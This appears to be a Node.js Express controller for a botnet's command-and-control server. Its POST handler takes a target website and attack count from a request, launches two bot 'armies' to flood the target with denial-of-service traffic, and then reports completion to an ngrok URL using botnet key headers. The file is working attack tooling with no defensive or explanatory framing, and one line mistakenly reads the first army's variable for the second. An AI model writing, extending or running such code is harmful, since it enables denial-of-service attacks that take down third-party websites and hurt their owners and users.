const axios = require('axios')
const armyBot = require('../utils/army')

class ControlControllers {

    // [GET] /
    index(req ,res, next) {
        res.status(200).json({
            status: 'Access Successfully',
            message: 'Welcome come back! Commander'
        })
    }

    // [POST] /
    async attackCommand(req, res, next) {
        try {
           const {websiteTarget, numberDos} = req.body
           res.end('OK! Start attacking target...')
           const army1 = process.env.NUM_ARMY1
           const army2 = process.env.NUM_ARMY1
           console.log(`Ngrok: ${process.env.URL_NGROK}`);
           console.log(`Army 1: ${army1}`);
            console.log(`Army 2: ${army2}`);

            await Promise.all([
               armyBot.createArmy(websiteTarget, army1, numberDos),
               armyBot.createArmy(websiteTarget, army2, numberDos),
            ])
            
            const response = await axios({
                method: 'post',
                url: process.env.URL_NGROK,
                headers: {
                    'X-Botnet-Army-Key': process.env.ARMY_KEY,
                    'X-Botnet-Army-Name': process.env.ARMY_NAME
                },
                data: {
                    messageBotnetArmy: 'Botnet1 Army has attacked the target.'
                }
            })

            console.log('Attacked done')

        } catch (error) {
            console.log(error);
        }
    }

}

module.exports = new ControlControllers